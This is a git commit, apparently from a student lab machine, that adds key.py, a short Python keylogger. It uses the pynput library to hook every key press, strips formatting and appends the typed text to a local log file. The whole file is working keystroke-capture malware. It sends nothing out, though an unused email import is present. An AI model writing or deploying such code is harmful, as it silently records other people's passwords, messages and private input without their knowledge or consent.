88641c2ccf4c304e097d5c74d6f8ac0c359f967b
Rafaela dos Santos <89286734+RafaelaDOT@users.noreply.github.com>
2022-12-14 14:38:27 -0300

    Create key.py

---
+++ key.py
@@ -0,0 +1,18 @@
+from pynput.keyboard import Listener
+import re
+import email
+
+arquivoLog = "/home/alunopc02/Downloads/keylogger/key.log"
+
+def capturar(tecla):
+    tecla = str(tecla)
+    tecla = re.sub(r'\'', '', tecla)
+    tecla = re.sub(r'Key.space', ' ', tecla)
+    tecla = re.sub(r'Key.enter', '\n', tecla)
+    tecla = re.sub(r'Key.*', '', tecla)
+
+    with open(arquivoLog, "a") as log:
+        log.write(tecla)
+
+with Listener(on_press=capturar) as l:
+    l.join()
